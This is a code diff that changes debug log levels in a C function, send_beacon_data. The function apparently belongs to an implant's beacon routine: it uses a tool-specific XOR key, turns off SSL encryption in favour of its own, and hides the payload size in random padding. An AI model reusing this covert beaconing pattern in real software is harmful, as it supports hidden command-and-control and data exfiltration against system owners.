@@ -582,10 +582,10 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	}
 
 	//setup ssl
-	DLX(4, printf("\tSetup crypto\n"));
+	DLX(7, printf("\tSetup crypto\n"));
 	if(crypt_setup_client( &hs, &ssl, &ssn, &sock ) != SUCCESS)
 	{
-		DLX(4, printf("\tERROR: crypt_setup_client()\n"));
+		DLX(7, printf("\tERROR: crypt_setup_client()\n"));
 		retval = FAILURE;
 		goto EXIT;
 	}
@@ -596,15 +596,15 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	ssl.xor_key = TOOL_ID_XOR_KEY;
 
 	//perform an SSL handshake
-	DLX(4, printf("\tPerform SSL handshake\n"));
+	DLX(7, printf("\tPerform SSL handshake\n"));
 	if( crypt_handshake(&ssl) != SUCCESS)
 	{
-		DLX(2, printf( "\tERROR: SSL connection with SSL server failed to initialize.\n"));
+		DLX(7, printf( "\tERROR: SSL connection with SSL server failed to initialize.\n"));
 			retval = FAILURE;
 		goto EXIT;
 	}
 
-	DLX(4, printf("\tHandshake Complete!\n"));
+	DLX(7, printf("\tHandshake Complete!\n"));
 
 	//turn off the ssl encryption since we us our own
 	ssl.do_crypt = 0;
@@ -614,9 +614,9 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 
 	//embed the data size so the server knows how much data to read
 	embedSize(encrypt_size,randData);
-	DLX(4, printf("\tEncrypt_size is %d \n", encrypt_size));
+	DLX(7, printf("\tEncrypt_size is %d \n", encrypt_size));
 
-	DLX(4, printf( "\tSending the first 64 bytes with data size encoded in random data\n"));
+	DLX(7, printf( "\tSending the first 64 bytes with data size encoded in random data\n"));
 	//send the bytes 
 	if( 0 > crypt_write(&ssl, randData,64) )
 	{  //TODO: this is probably no the best check... maybe 32 > cryptwrite
@@ -664,7 +664,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 		{
 			sz_to_send = encrypt_size - bytes_sent;
 		}
-		DLX(4, printf("\tSending: %d bytes\n", sz_to_send));
+		DLX(7, printf("\tSending: %d bytes\n", sz_to_send));
 
 		//reset the buffer
 		memset(randData, 0, 64);
